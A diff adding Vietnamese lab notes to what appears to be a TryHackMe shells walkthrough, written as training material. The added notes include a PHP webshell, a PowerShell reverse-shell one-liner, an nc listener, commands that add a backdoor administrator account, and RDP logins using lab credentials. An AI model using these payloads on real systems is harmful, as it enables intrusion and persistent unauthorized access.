@@ -299,6 +299,44 @@ Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Win
 Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?\
 https://tryhackme.com/room/introtoshells\
 
+Tạo webshell đơn giản:
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+Tạo reverse shell với reverse shell one liner powershell:
+```powershell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+Encode url và thực thi thông qua webshell:\
+![image](https://user-images.githubusercontent.com/95600382/150101289-e46d5c32-0890-469e-b2f3-09db4c371fc0.png)\
+Thực hiện lắng nghe với nc:
+```
+nc -lvnp 53
+```
+![image](https://user-images.githubusercontent.com/95600382/150101442-2aab6af4-fbc2-4a03-b99c-80356e28906d.png)\
+Tạo user thông qua reverse shell và thêm vào gr addministrator:
+```
+net user hieuba hieuba /add
+net localgroup administrators hieuba /add
+```
+![image](https://user-images.githubusercontent.com/95600382/150101775-80677558-2855-4228-b420-bc1cc623cb9f.png)\
+
+Thực hiện RDP với user vừa tạo:
+```
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.36.234 /u:hieuba /p:'hieuba'
+```
+![image](https://user-images.githubusercontent.com/95600382/150102422-34e74905-ae68-40dc-92a9-487ad3b83795.png)\
+![image](https://user-images.githubusercontent.com/95600382/150103152-255d6e7a-7ae1-49ef-8b82-428f2ecce780.png)\
+
+Thực hiện kỹ thuật bind shell với user admin:
+```
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.36.234 /u:Administrator /p:'TryH4ckM3!'
+```
+![image](https://user-images.githubusercontent.com/95600382/150107586-20bf1f31-4060-48d5-8085-a7c53d086812.png)\
+
+Thực hiện bind shell với socat
+![image](https://user-images.githubusercontent.com/95600382/150108968-fbb43068-580b-462e-a9f0-45e320f7c8ab.png)\
+
 
 
 
